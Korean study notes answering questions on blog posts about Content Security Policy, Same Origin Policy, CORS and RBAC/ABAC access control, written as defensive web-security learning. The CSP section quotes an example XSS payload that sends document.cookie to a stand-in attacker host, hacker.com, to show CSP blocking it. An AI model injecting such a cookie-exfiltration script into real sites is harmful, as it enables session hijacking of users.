- **📚 블로그 읽고 Content Security Policy(CSP) 정리해보기 🍠**
    
    # **📚 블로그 읽고 Content Security Policy(CSP) 정리해보기 🍠**
    
    ---
    
    [개발자 매튜 | Content Security Policy(CSP)로 배우는 웹 보안 설정법](https://www.yolog.co.kr/post/http-content-security-policy)
    
    - 서버에서 HTML 문서를 응답할 때 CSP를 적용하려면 어떤 HTTP 응답 헤더를 설정해야 하나요? 블로그에 나온 Express.js 코드 예시를 기반으로 설명해보세요.
        
        ```c
        res.setHeader('Content-Security-Policy', "default-src 'self'")
        ```
        
        서버에서 웹 문서를 응답할 때 해당 `Content-Security-Policy` 헤더에 적절한 정책을 명시하면 브라우저가 이를 따릅니다.
        
    - `default-src 'self'` 설정은 브라우저에게 어떤 보안 정책을 의미하나요? 또한 `'self'` 값은 어떤 출처를 포함하거나 제외하나요?
        
        여러 자원 형태의 정책을 지정할 수 있는데, `default-src` 는 fallback 으로 동작합니다. 다른 설정이 없다면 `default-src` 의 설정값을 따르며, `‘self’` 는 현재 문서의 출처를 의미합니다.
        
        따라서 위의 설정은 브라우저가 현재 출처의 자원만 사용하라는 기본값을 명시한 것입니다.
        
    - 블로그에 나온 악성 스크립트(`<script>fetch(...)</script>`)를 주입했을 때 CSP가 어떻게 동작하는지 네트워크 탭과 콘솔 메시지 측면에서 설명해보세요.
        
        ```html
        <script> fecth(`http://hacker.com:8081?cookie=${document.cookie}`) </script>
        ```
        
        fetch 함수를 실행하는 악성 스크립트를 위와 같이 주입할 때, 네트워크 탭을 확인하면 [hacker.com](http://hacker.com) 으로 네트워크 요청이 발생하지 않은 것을 볼 수 있습니다. 
        
        브라우저 콘솔에서는 Content Security Policy 경고가 표시되고, “다음 지시자를 위반했기 때문에 인라인 스크립트가 실행되지 않도록 차단했다” 라는 메세지를 볼 수 있습니다.
        
        이는 브라우저가 CSP 정책을 올바르게 이행했다는 의미입니다.
        
        특이점은 인라인 스타일도 차단된다는 점입니다.
        
        즉, CSP 는 인라인 스크립트 뿐만 아니라 인라인 스타일까지 차단하여 보안을 강화합니다.
        
    - 기본 CSP 설정에서 인라인 스타일이 차단된다고 했습니다. 블로그 예시 중 `width:600px`이 적용되지 않는 이유를 설명하세요.
        
        CSP 가 인라인 스크립트 뿐만 아니라 인라인 스타일까지 차단하여 보안을 강화하기 때문입니다.
        
    - 구글 애널리틱스, 카카오맵, 외부 API 등이 CSP 때문에 차단될 수 있다고 했습니다. 이러한 현상을 "건물 보안을 강화한다"는 비유와 연결해 설명해보세요.
        
        건물 보안을 강화하기 위해 모든 출입문을 막아버려, 정작 직원들도 출입하지 못하는 상황과 같다. 따라서 CSP 는 단계적으로 적용하며 서비스에 미치는 영향을 지속적으로 모니터링 할 필요가 있다.
        
    - Report-Only 모드에서는 실제 리소스 실행이 차단되지 않습니다. 그 대신 브라우저와 서버에서 각각 어떤 동작을 수행하나요?
        1. 브라우저가 정책 위반을 진단만 합니다.
        2. 리소스 로드는 차단하지 않고 그대로 실행합니다.
        3. 진단 결과를 서버로 보고합니다.
    - CSP만으로는 CSRF를 막을 수 없다고 했습니다. 블로그에 정리된 다른 보안 조치들(SameSite 쿠키, X-Frame-Options 등) 중 2가지를 설명하세요.
        1. 쿠키 보안 설정
            - `SameSite` 속성 : CSRF 공격 방어
            - `HttpOnly` 속성 : 클라이언트 측 스크립트의 쿠키 접근 차단
            - `Secure` 속성 : HTTPS 연결에서만 쿠키 전송
        
        1. 입력 데이터 검증
            - Sanitize : 악성 코드 제거
            - Escape : 특수 문자 이스케이프 처리
            - Validation : 데이터 형식 및 범위 검증
        
        1. 추가 보안 헤더
            - `X-Frame-Options` : 클릭재킹 방어
            - `X-Content-Type-Options` : MIME 타입 스니핑
            - `Strict-Transport-Security` : HTTPS 강제
    
- **📚 블로그 읽고 동일 출처 정책(Same Origin Policy) 정리해보기 🍠**
    
    # **📚 블로그 읽고 동일 출처 정책(Same Origin Policy) 정리해보기 🍠**
    
    ---
    
    [개발자 매튜 | 웹 보안의 핵심, Same Origin Policy(동일 출처 정책) 쉽게 이해하기](https://www.yolog.co.kr/post/http-same-origin-policy)
    
    - 출처(Origin)는 어떤 세 요소의 조합으로 결정되나요?
        - 프로토콜 (http, https)
        - 호스트 (도메인)
        - 포트 (80, 443, 8080 등)
        
        위의 세 가지 요소가 모두 일치하여야 같은 출처로 간주된다.
        
    - 출처의 요소가 다른 경우(예: 프로토콜만, 포트만 다른 경우)에 같은 출처인지 아닌지를 예시 3개(같은 출처 1개, 다른 출처 2개)로 설명하세요.
        
        같은 출처
        
        | 구분 | URL |
        | --- | --- |
        | A | `https://example.com:443/page1.html` |
        | B | `https://example.com:443/page2.html` |
        
        다른 출처 (프로토콜만 다름)
        
        | 구분 | URL |
        | --- | --- |
        | A | `http://example.com:80/page.html` |
        | B | `https://example.com:80/page.html` |
        
        다른 출처 (포트만 다름)
        
        | 구분 | URL |
        | --- | --- |
        | A | `https://example.com:443/page.html` |
        | B | `https://example.com:8080/page.html` |
    - 블로그에 나온 `fetch` 기반 악성 스크립트를 다른 출처로 실행했을 때 브라우저에서 어떤 일이 발생하나요? 네트워크 전송 여부, 응답 사용 가능성, 브라우저 콘솔 메시지 측면에서 서술하세요.
        
        fetch 기반 악성 스크립트를 전송하면 네트워크는 전송되지만 응답 데이터를 사용할 수 없고, 브라우저가 오류를 발생시킵니다. 브라우저는 “동일 출처 정책으로 인해 [`hacker.com`](http://hacker.com) 에 있는 원격 리소스를 차단했다.” 라는 오류 메세지를 표시합니다. 
        
        이것이 `SOP (Same Origin Policy)` 가 동작하는 방식입니다.
        
    - SOP가 어떻게 Session Hijacking(세션 하이재킹) 시도를 방지하는지 구체적으로 설명하세요. SOP가 차단하는 것과 허용되는 것(예: 네트워크 요청은 나가지만 응답 데이터에 접근 불가)을 포함하세요.
        
        SOP 는 보안 상의 이유로 브라우저가 서로 다른 출처에서 불러온 리소스 간의 접근을 제한하는 정책입니다. 
        
        ⇒ 즉, 한 출처에서 실행 중인 스크립트가 다른 출처의 데이터에 임의로 접근하지 못하도록 막습니다.
        
        SOP 는 세션 쿠키가 다른 출처의 스크립트에 노출되는 것을 차단하여 세션 하이재킹 시도를 대부분 무력화 시킵니다.
        
        1. 사용자가 https://chichi.com 에 로그인을 함
            
            → 세션 쿠키 : session=chichi123 (브라우저에 저장됨)
            
        2. 공격자가 만든 악성 사이트 : http://hacker.com
        
        공격자는 JS 에 악성 스크립트를 실행시킵니다.
        
        이때, SOP 가 차단하는 부분은
        
        1. [chichi.com](http://chichi.com) → [hacker.com](http://hacker.com) 으로 요청
            
            ⇒ 요청은 가능하나 [hacker.com](http://hacker.com) 의 쿠키도 포함해서 요청을 보냅니다.
            
        2. [chichi.com](http://chichi.com) 의 서버는 세션 쿠키를 포함한 정상 요청으로 판단 → 응답 반환
            
            ⇒ 정상 응답을 보냄
            
        3. [hacker.com](http://hacker.com) 의 JS 가 응답 본문에 접근 시도
            
            ⇒ SOP 에 의해 차단됨 (CORS 허용이 없으면 응답 내용 접근 불가)
            
        
        즉, 요청은 나가지만 응답 데이터에는 접근할 수 없습니다.
        
        ⇒ 이것이 SOP 가 세션 하이재킹을 막는 핵심 포인트입니다.
        
    - 블로그에서 명시한 대로 SOP가 반드시 동일 출처에서만 접근하도록 하는 주요 브라우저 API/리소스 3가지를 쓰고, 각각에 대해 간단한 설명(왜 제한되는지)을 덧붙이세요.
        - fetch()
            - 네트워크 요청을 보내는 최신 JS API 입니다. 다
            - 다른 출처로 요청을 보낼 수 있지만 SOP 에 의한 응답 본문 접근은 금지됩니다. (단, CORS 허용 헤더가 있을 경우 예외적으로 접근 가능)
        - XMLHttpRequest
            - 브라우저 내 스크립트에서 서버와 비동기적으로 데이터 교환 가능
            - SOP 에 의해 요청은 전송되나, 다른 출처의 응답 데이터는 읽을 수 없음
        - @font-face
            - 다른 출처의 폰트를 불러올 경우에도 SOP 가 적용되어 해당 서버가 CORS 허용 헤더를 보내야만 브라우저가 폰트를 렌더링에 사용 가능
    - SOP와 CSP의 차이를 블로그 내용에 따라 요점 4개(각 항목 1문장)로 정리하세요. (예: 누가 적용하는가, 제어 주체, 설정 가능 여부 등)
        
        [**CSP(Content Security Policy)**](https://www.yolog.co.kr/post/http-same-origin-policy#cspcontent-security-policy)
        
        - **서버-브라우저 협력 정책**: 서버에서 정책을 설정하고 브라우저가 실행
        - **개발자가 직접 설정**: HTTP 응답 헤더를 통해 정책 전달
        - **애플리케이션별 맞춤 설정**: 각 서비스의 요구사항에 맞게 조정 가능
        - **유연한 정책 관리**: Report-Only 모드로 단계적 적용 가능
        
        [**SOP(Same Origin Policy)**](https://www.yolog.co.kr/post/http-same-origin-policy#sopsame-origin-policy)
        
        - **브라우저 기본 정책**: 서버 개입 없이 브라우저가 자체적으로 적용
        - **자동 적용**: 별도 설정 없이 모든 웹페이지에 기본 적용
        - **브라우저별 구현 차이**: 세부 동작이 브라우저마다 약간씩 다름
        - **프로그래밍 영역 밖**: 개발자가 직접 제어할 수 없음
    - 브라우저에서 SOP 관련 차단 오류를 발견했을 때(예: 콘솔에 “동일 출처 정책으로 인해 ... 차단했습니다” 메시지) 문제 원인 파악을 위한 체크리스트(최소 3항목)를 작성하고, 임시·영구 대응 방안(각 1~2줄)도 제시하세요.
        - [ ]  요청 출처와 대상 서버 출처가 동일한가?
        - [ ]  대상 서버가 CORS 응답 헤더를 보내는가?
        - [ ]  요청 방식과 헤더가 단순 요청인가?
        - [ ]  프록시 또는 리버스 프록시 설정 문제는 없는가?
        
        대응 방안
        
        - [ ]  CORS 프록시 사용 또는 로컬 서버 프록시 설정
            
            → Vite dev 서버 proxy 옵션으로 /api 를 https://api.chichi.com 에 매핑
            
        - [ ]  서버에서 CORS 허용 헤더 설정
            
            → 서버 응답에 Access-Control-Allow-Origin: [http://localhost:3000](http://localhost:3000/) 추가

- **📚 블로그 읽고 교차 출처 리소스 공유(CORS) 정리해보기 🍠**
    
    # **📚 블로그 읽고 교차 출처 리소스 공유(CORS) 정리해보기 🍠**
    
    ---
    
    [개발자 매튜 | 악명 높은 CORS(교차 출처 리소스 공유) 쉽게 이해하기](https://www.yolog.co.kr/post/http-cors)
    
    - 브라우저에서 `http://localhost:8080` 애플리케이션이 `http://localhost:8081/resource.json`을 요청했을 때, 네트워크 요청과 응답은 어떻게 처리되며, 브라우저가 응답 본문을 사용하지 못하는 이유는 무엇인가요?
        
        콘솔을 통해 확인해 보면 “교차 출처 요청 차단” 이라는 경고가 표시됩니다. 동일 출처 정책으로 인해 8080 번 포트가 아닌 8081 번 포트를 사용하는 서버의 리소스가 차단되었기 때문입니다.
        
        원인은 Access-control-Allow-Origin CORS 헤더가 없기 때문입니다.
        
    - 서버가 다른 출처(`http://localhost:8080`)에서 자원을 사용할 수 있게 하려면 어떤 응답 헤더를 어떻게 설정해야 하나요? 글의 예시 코드를 참고해 헤더 이름과 값까지 구체적으로 쓰세요.
        
        브라우저는 다른 출처로 요청을 보낼 때
        
        1. 응답 헤더 중 Access-Control-Allow-Origin 을 확인합니다.
        2. 이 헤더에 현재 출처가 포함되어 있는지 검사합니다.
        3. 서버가 해당 출처를 허용했는지 판단합니다.
        
        ```tsx
        const handler = (request, response) => {
        	response.setHeader('Access-Control-Allow-Origin',
        											'http://localhost:8080');
        	
        	static(path.join(__dirname, 'public'))(request,response);
        }
        ```
        
    - 단순 요청으로 분류되기 위해서는 어떤 두 가지 조건을 만족해야 하나요? 또한 `GET /resource.json` 요청이 단순 요청에 해당하는 이유를 설명하세요.
        1. 허용된 HTTP 메소드 사용
            - GET
            - POST
            - HEAD
        2. 안전한 헤더 사용
            
            : 교차 출처 요청에서 사용할 수 있는 헤더
            
        
        CORS 사양에서 정의한 단순 요청의 조건을 충족하기 때문이다.
        
        1. HTTP 메서드 : GET 사용
        2. 헤더 : 브라우저가 자동으로 추가한 기본 헤더 사용
        3. Content-Type : 존재하지 않거나 브라우저가 자동 설정
        4. 요청 본문 : GET 은 body 를 가지지 않으므로 없음
    - 브라우저에서 `X-Goguma`라는 커스텀 헤더를 추가했을 때 왜 차단이 발생하나요? 이 문제를 해결하기 위해 서버에서 추가해야 하는 응답 헤더와 값은 무엇인가요?
        
        동일 출처 정책으로 인해 원격 리소스가 차단되었다. Access-Control-Allow-Headers 에 헤더 X-Goguma 가 허용되지 않았다고 표시된다.
        
        안전하지 않은 헤더를 사용하려면 서버가 Access-Control-Allow-Headers 응답 헤더에 허용할 헤더 이름을 명시해야 한다.
        
        ```tsx
        const handler = (request, response) => {
        	response.setHeader('Access-Control-Allow-Origin', 
        											'http://localhost:8080');								
        	response.setHeader('Access-Control-Allow-Headers', 
        											'X-Goguma');
        	
        	static(path.join(__dirname, 'public'))(request, response);
        }
        ```
        
    - `PUT` 요청을 보낼 때 브라우저는 왜 먼저 `OPTIONS` 요청을 보내나요? 이때 브라우저가 보내는 헤더와 서버가 응답해야 하는 헤더를 각각 쓰고, 사전 요청과 실제 요청이 어떻게 이어지는지 간단히 서술하세요.
        
        서버가 요청을 보낸 측이 브라우저가 아닐 수 있다고 판단하여 브라우저와 서버는 서로를 확인하기 위한 사전 요청을 주고 받습니다.
        
        OPTIOS 는 사전 요청이고
        
        1. 요청 : Access-Control-Request-Method : PUT
        2. 응답 : Access-Control-Allow-Methods : PUT
        
        를 통해서 서버가 PUT 메소드 사용을 허락함을 알립니다.
        
        이후 실제 PUT 요청이 전송되고, 응답 본문도 정상적으로 수신됩니다.
        
        브라우저는 서버가 PUT 메소드를 허용하였구나라고 판단하여 애플리케이션에서 응답을 사용할 수 있도록 허락한 것입니다.

- **📚 블로그 읽고 ABAC 정리해보기 🍠**
    
    # **📚 블로그 읽고 ABAC 정리해보기 🍠**
    
    ---
    
    <aside>
    🍠
    
    해당 블로그 포스트는 제가 실제로 사내에서 겪은 문제점을 쉽게 해결하기 위해 고민한 내용을 담은 글입니다!
    
    여러분들이라면, 어떠한 상황일 때 의사결정을 내릴지 여러분의 입장에서 정리를 해보시면 좋을 것 같습니다!
    
    늘 그렇지만 블로그를 읽고 답변하는 부분에는 명확한 정답이 없으니 정말 편하게 고민하는 시간을 갖어보셨으면 합니다!
    
    - UMC 중앙 웹 파트장 매튜/김용민 -
    
    </aside>
    
    [개발자 매튜 | 복잡한 권한, 깔끔하게 관리하기 - ABAC 도입기](https://www.yolog.co.kr/post/rbac-abac)
    
    - **RBAC**의 한계에 대해 설명해주세요.
        
        서비스가 성장하면서 다양한 예외 케이스가 생기고, 역할만으로는 설명이 안 되는 권한이 점점 많아졌다.
        
        RBAC : 심플해서 좋으나 서비스가 커지면 한계가 옴
        
    - **ABAC**으로의 전환, 어떤 '기준'이 적절할까요?
        
        ABAC 는 사용자, 리소스, 환경의 속성을 기반으로 접근을 제어합니다.
        
        따라서, 다음과 같은 기준으로 전환하는 것이 적절합니다.
        
        1. 역할로만 접근 조건을 표현하기 어려운 경우
        2. 세분화된 접근 제어가 필요한 서비스
        3. 다부서 / 다조직 통합 환경
        4. 빈번한 정책 변경이 예상될 때
    - 어떤 서비스 영역에 **RBAC**을 남겨두고, **ABAC**을 도입하시겠어요?
        - RBAC 은 정적·조직적 권한 구조에 적합
        - ABAC 은 데이터·상황·속성 기반의 세밀한 정책에 적합
        
        RBAC
        
        - 인사 / 관리자용 시스템 (관리자 페이지) : 명확한 역할 계층 존재
        - 단순 사용자 구분 (일반 / 관리자 / 게스트) : 역할 구조가 단순 명확, 불필요한 복잡도 방지
        
        ABAC
        
        - 업무 데이터 접근 영역 (문서, 파일, 프로젝트 등) : 부서, 소유자, 보안 등급, 생성 시간 등 속성 기반 제어 필요
        - API 게이트웨이 / 마이크로서비스 인증 레벨 : 서비스 간 통신 시 동적 컨텍스트에 따른 제어 유리
    - 여러분들은 다른 부서에서 요청을 받았을 때 어떤식으로 행동하실껀가요?
        1. 요청 목적 확인 : 불필요한 권한 확장을 방지
        2. 속성 기반으로 정책화 시도 : 재사용 가능한 정책 구조 확보
        3. 감사 로그 및 승인 프로세스 유지 : 보안 감사 및 책임 추적 가능
        4. 긴급 요청은 임시 정책으로 처리 : 영구 권한 오남용 방지